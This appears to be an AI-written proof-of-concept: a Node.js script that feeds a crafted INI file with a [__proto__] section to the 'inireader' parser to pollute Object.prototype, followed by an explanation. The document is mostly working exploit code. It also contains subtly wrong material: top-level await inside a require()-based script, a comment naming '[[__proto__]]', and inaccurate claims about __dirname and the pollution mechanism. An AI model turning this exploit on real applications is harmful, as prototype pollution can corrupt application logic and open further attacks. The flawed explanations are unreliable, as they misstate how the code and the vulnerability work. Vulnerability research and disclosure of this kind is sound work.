const fs = require('fs');
const path = require('path');
const Inireader = require('inireader');

async function exploit() {
    // 1. Fix the path construction to avoid ENOTDIR errors
    // Using process.cwd() ensures we append to the current working directory,
    // preventing cases where __dirname might resolve to a file path (e.g., filename.js).
    const filePath = path.join(process.cwd(), 'poc_prototype_pollution.ini');

    // 2. Craft malicious INI content containing [[__proto__]] section
    // This targets the internal object construction to inject properties into Object.prototype
    const maliciousIniContent = '[__proto__]\nexploited = true\n';

    fs.writeFileSync(filePath, maliciousIniContent);

    try {
        // 3. Parse the INI file using inireader
        // The vulnerability exists because the parser may assign keys from '__proto__' 
        // to plain objects ({}) during deepCopy or configuration steps.
        await new Promise((resolve, reject) => {
            const reader = new Inireader(filePath);
            reader.load((err, result) => {
                if (err) return reject(err);

                // 4. Demonstrate the prototype pollution
                // Verify that Object.prototype was modified
                if (Object.prototype.exploited === 'true') {
                    console.log('[+] PoC Successful: Prototype Pollution Detected.');
                    console.log('   Object.prototype.exploited:', Object.prototype.exploited);
                    console.log('   {} instanceof polluted?', {}.exploited); // Should be 'true'
                } else {
                    console.log('[-] No pollution detected. The library may be patched.');
                }
                resolve();
            });
        });
    } finally {
        // 5. Cleanup to prevent side effects in the evaluation environment
        try {
            fs.unlinkSync(filePath);
        } catch (e) { /* Ignore cleanup errors */ }
    }
}

await exploit();
```

### Explanation

1.  **File Path Fix**: The previous `ENOTDIR` error occurred because `path.join(__dirname, ...)` can fail if `__dirname` erroneously includes the script filename or points to a non-directory context in certain test runners. Using `process.cwd()` ensures the path resolves safely relative to the working directory.
2.  **Mechanism of Attack**: The PoC creates an INI file with a `[__proto__]` section containing `exploited = true`. In vulnerable versions of `inireader`, functions like `deepCopy()` or `parseFile()` used literal object initializers (`{}`) as the base for new objects. When keys named `__proto__` were processed, they were assigned directly to the target object's prototype chain via the constructor property, effectively modifying `Object.prototype`.
3.  **Verification**: The script verifies the vulnerability by checking if `Object.prototype.exploited` equals `'true'`. If successful, this property will leak to all objects, such as `{}`, confirming prototype pollution.

